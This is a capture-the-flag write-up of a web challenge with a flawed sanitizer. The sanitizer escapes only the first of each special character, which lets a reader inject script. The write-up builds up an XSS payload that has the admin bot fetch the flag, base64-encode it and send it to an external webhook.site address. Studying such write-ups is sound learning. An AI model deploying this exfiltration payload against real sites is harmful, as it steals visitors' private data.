# Xtra Salty Sardines [![Generic badge](https://img.shields.io/badge/Difficulty-Easy-green.svg)](https://shields.io/)

## Description

Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, and then got a revolutionary new challenge idea. What if he wrote a site with an extremely suggestive acronym?

Author: aplet123

## Files
```
.
└── index.js
```
Additionally, there is an `AdminBot` that clicks on every link you give them.

## Solution

The challenge welcomes us with a formula asking for the names of our sardines. Let's name them `test` and proceed. The site then complains, "Your sardine's name is `test`!
Unfortunately, your flag is in another sardine."
Considering the "extremely suggestive name" and the AdminBot, we are probably looking for an XSS. First, let's look at the source code, where our name is processed.

```JavaScript
const name = req.body.name
    .replace("&", "&amp;")
    .replace('"', "&quot;")
    .replace("'", "&apos;")
    .replace("<", "&lt;")
    .replace(">", "&gt;");
```

At first glance, lines 41 to 46 seem to remove important characters for an XSS. But at a second look, we see that the developer used `replace` instead of `replaceAll`. Fortunately, that only removes the first appearance of this character. If we preseed our payload with all of them once, we should be able to inject some XSS.

```
&"'<><script>alert('XSS')</script>
```
That worked out great. Now let's try to fetch the flag with javascript and alert this.

```
&"'<><script>var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://xtra-salty-sardines.web.actf.co/flag",false);xmlHttp.send();alert(xmlHttp.responseText);</script>
```

Unfortunately, some browsers, especially chromium, won't send some characters in a get request. So to make the admin send the flag to a jar where we can later grab it, we need to base64 encode it. 

```
&"'<><script>var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://xtra-salty-sardines.web.actf.co/flag",false);xmlHttp.send();alert(btoa(xmlHttp.responseText));</script>
```

Looks good. To receive it, we need a webhook. `webhook.site` should do the job. It automatically creates an individual webhook for you. You can view who visited your webhook and the used URL, including search parameters. All that is left is sending the encoded flag to the jar.

```
&"'<><script>var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://xtra-salty-sardines.web.actf.co/flag",false);xmlHttp.send();fetch("https://webhook.site/42f11a11-c502-418c-b6a3-46ac414339af?flag="+btoa(xmlHttp.responseText));</script>
```

Send the AdminBot the link and decode the flag.